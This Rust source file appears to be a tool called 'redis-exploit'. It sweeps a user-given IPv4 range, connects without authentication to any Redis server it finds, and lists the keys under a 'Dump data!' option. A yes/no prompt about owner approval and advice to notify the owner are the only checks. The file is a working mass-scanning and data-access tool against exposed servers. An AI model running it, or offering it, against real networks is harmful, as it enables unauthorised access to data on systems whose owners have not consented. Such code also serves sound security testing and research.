use dialoguer::{theme::ColorfulTheme, Select};
use ipnetwork::IpNetwork;
use redis::Commands;
use std::env;
use std::println;

fn is_valid_ip_range(ip_range: &str) -> bool {
    match ip_range.parse::<IpNetwork>() {
        Ok(ip_network) => ip_network.is_ipv4() || ip_network.is_ipv6(),
        Err(_) => false,
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if let Some(range) = args.get(1) {
        if !is_valid_ip_range(&range) {
            println!("[!] Range {:?} is not valid", &range);
            std::process::exit(1)
        }
        println!("[i] Testing range {:?} for Redis Vulnerability", &range);
        let network: IpNetwork = range.parse().unwrap();
        if let IpNetwork::V4(network) = network {
            for ip in network.iter() {
                println!("  [i] Checking IP {:?}", &ip);
                let target: String = format!("redis://{}", ip);
                let client = redis::Client::open(target).unwrap();
                let connection: Result<redis::Connection, redis::RedisError> =
                    client.get_connection();
                match connection {
                    Ok(mut con) => {
                        println!("      [+] {} may be vulnerable to an attack!", &ip);
                        let keys: Result<Vec<String>, redis::RedisError> = con.keys("*");
                        match keys {
                            Ok(keys) => {
                                let options = &["Abort and inform server owner", "Dump data!"];
                                let selection = Select::with_theme(&ColorfulTheme::default())
                                    .with_prompt(
                                        "How do you wish to proceed? Please select an action:",
                                    )
                                    .items(options)
                                    .default(0)
                                    .interact()
                                    .unwrap();

                                match selection {
                                    0 => {
                                        println!("[i] Aborting! Please contact the server owner and inform them about the vulnerability!");
                                        std::process::exit(1)
                                    }
                                    1 => {
                                        let options_dump = &["NO", "Yes"];
                                        let selection_dump = Select::with_theme(&ColorfulTheme::default())
                                            .with_prompt("Do you have server owner's approval to dump date from this server?")
                                            .items(options_dump)
                                            .default(0)
                                            .interact()
                                            .unwrap();

                                        match selection_dump {
                                            0 => {
                                                println!("[i] Aborting! Please contact the server owner and inform them about the vulnerability!");
                                                std::process::exit(1)
                                            }
                                            1 => {
                                                println!("[+] Dumping data...");
                                                for key in &keys {
                                                    println!("  [key] {}", &key);
                                                }
                                                std::process::exit(0);
                                            }
                                            _ => unreachable!(),
                                        }
                                    }
                                    _ => unreachable!(),
                                }
                            }
                            Err(err) => println!(
                                "      [-] False positive! {} not vulnerable! Err: {}",
                                &ip, &err
                            ),
                        }
                    }
                    Err(e) => println!("      [-] Port closed on {}. Err: {}", &ip, &e),
                }
            }
        }
    } else {
        println!("[!] Please add a range. i.e. ./redis-exploit <RANGE> (0.0.0.0/24)")
    }
}
